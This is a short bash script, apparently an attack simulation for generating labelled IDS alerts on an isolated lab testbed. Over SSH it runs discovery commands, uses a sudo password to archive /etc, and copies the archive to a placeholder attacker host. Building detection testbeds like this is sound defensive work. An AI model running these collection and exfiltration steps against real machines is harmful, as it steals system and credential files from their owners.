#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


# === SETTINGS ===
TARGET_IP="<TARGET_IP>"
TARGET_USER="user"

TARGET_PASSWORD="<TARGET_PASSWORD>"   # <-- set your lab sudo password
echo "[+] Starting Attack Phase 4: Execution, Discovery, Collection"

# 1. Execution: Simulate shell command
echo "[+] Running execution commands (uname)..."
ssh -tt ${TARGET_USER}@${TARGET_IP} 'uname -a; whoami; id'

# 2. Discovery: List running processes
echo "[+] Running process listing..."
ssh -tt ${TARGET_USER}@${TARGET_IP} 'ps aux | grep sshd'

# 3. Collection: Archive system files
echo "[+] Creating fake archive of /etc..."
ssh -tt ${TARGET_USER}@${TARGET_IP} 'echo "$TARGET_PASSWORD" | sudo -S tar -czf /tmp/etc_backup.tar.gz /etc'

# 4. Exfiltrate the archive to attacker (Kali) — Visible to Suricata
echo "[+] Exfiltrating archive to attacker..."
ssh -tt ${TARGET_USER}@${TARGET_IP} "scp /tmp/etc_backup.tar.gz kali@<ATTACKER_IP>:/tmp/"

echo "[+] Phase 4 simulation complete."

